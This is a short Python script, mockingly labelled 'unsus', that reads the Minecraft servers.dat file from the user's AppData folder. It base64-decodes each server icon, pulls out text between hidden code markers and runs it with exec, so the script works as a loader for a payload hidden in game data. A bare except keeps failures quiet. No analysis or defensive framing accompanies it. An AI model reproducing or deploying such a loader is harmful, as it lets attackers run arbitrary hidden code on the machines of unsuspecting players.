# simple unsus python code here 👀

import os, pynbt, base64

for server in pynbt.NBTFile(io=(f := open(f'{os.getenv("appdata")}\\.minecraft\\servers.dat', 'rb')))['servers']:
    try:
        exec(base64.b64decode(server['icon'].value.encode()).decode(errors='ignore').split('[<code_start>]')[1].split('[<code_end>]')[0])
        f.close()
        break
    except:
        continue
